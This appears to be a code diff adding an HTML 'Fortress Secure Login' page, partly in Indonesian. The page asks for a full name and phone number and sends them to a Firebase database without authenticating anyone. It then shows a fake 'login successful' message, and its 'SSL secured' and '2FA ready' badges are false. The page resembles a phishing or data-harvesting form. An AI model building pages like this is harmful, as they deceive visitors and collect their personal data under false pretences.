@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Fortress Secure Login</title>
+  <style>
+    body { margin:0; font-family:Arial,sans-serif; display:flex; height:100vh; }
+    .left { flex:1; background:#f0f0f0; color:#333; padding:40px; display:flex; flex-direction:column; justify-content:center; }
+    .left h2 { margin-bottom:20px; }
+    .left p { margin:8px 0; }
+    .right { flex:1; background:#fff; display:flex; flex-direction:column; justify-content:center; align-items:center; padding:40px; }
+    .form-box { width:100%; max-width:400px; }
+    .form-box h2 { margin-bottom:20px; color:#0077b6; }
+    input { width:100%; padding:10px; margin:10px 0; border:1px solid #ccc; border-radius:4px; }
+    label { font-size:14px; }
+    button { background:#0077b6; color:white; border:none; padding:10px; border-radius:4px; cursor:pointer; width:100%; margin-top:10px; }
+    button:hover { background:#005f87; }
+    .extra { margin-top:15px; font-size:12px; text-align:center; }
+    .badges { margin-top:15px; font-size:12px; color:#555; text-align:center; }
+    footer { background:#eee; padding:10px; text-align:center; font-size:12px; position:absolute; bottom:0; width:100%; }
+  </style>
+</head>
+<body>
+  <!-- Panel Kiri -->
+  <div class="left">
+    <h2>ENTERPRISE GRADE</h2>
+    <p><strong>Vault Access</strong> – selamat datang toko kami</p>
+    <p><strong>Instant Sync</strong> – Global nodes ensure low-latency connectivity</p>
+  </div>
+
+  <!-- Panel Kanan -->
+  <div class="right">
+    <div class="form-box">
+      <h2>Sign In</h2>
+      <p>Enter your credentials to access the secure portal.</p>
+      <form id="loginForm">
+        <label for="fullname">Full Name</label>
+        <input type="text" id="fullname" required>
+        
+        <label for="phone">Phone Number</label>
+        <input type="text" id="phone" required>
+        
+        <div>
+          <input type="checkbox" id="keepLoggedIn">
+          <label for="keepLoggedIn">Keep me logged in</label>
+        </div>
+        
+        <button type="submit">LOGIN</button>
+      </form>
+      <div class="extra">
+        <p><a href="#">Forgot ID?</a></p>
+        <p>New to Fortress? <a href="#">Create an account</a></p>
+      </div>
+      <div class="badges">
+        🔒 SSL SECURED | 🔑 2FA READY
+      </div>
+    </div>
+  </div>
+
+  <footer>© 2026 Fortress Systems. All rights reserved. | Privacy Policy | Terms of Service | Security Audit | Contact Support</footer>
+
+  <!-- Firebase + Logic -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-analytics.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyADDGb72Ag8kj7Z5yOVl6J10P09yx3ywew",
+      authDomain: "daftar-akun-1770b.firebaseapp.com",
+      databaseURL: "https://daftar-akun-1770b-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "daftar-akun-1770b",
+      storageBucket: "daftar-akun-1770b.firebasestorage.app",
+      messagingSenderId: "386050985636",
+      appId: "1:386050985636:web:7bb56a672700c666496031",
+      measurementId: "G-FGDBK0BZV0"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const db = getDatabase(app);
+
+    document.getElementById("loginForm").addEventListener("submit", function(e){
+      e.preventDefault();
+      const fullname = document.getElementById("fullname").value;
+      const phone = document.getElementById("phone").value;
+
+      push(ref(db, "loginData"), {
+        fullname: fullname,
+        phone: phone,
+        waktu: new Date().toLocaleString()
+      });
+
+      alert("Login berhasil! Selamat datang, " + fullname);
+      window.location.href = "dashboard.html";
+    });
+  </script>
+</body>
+</html>
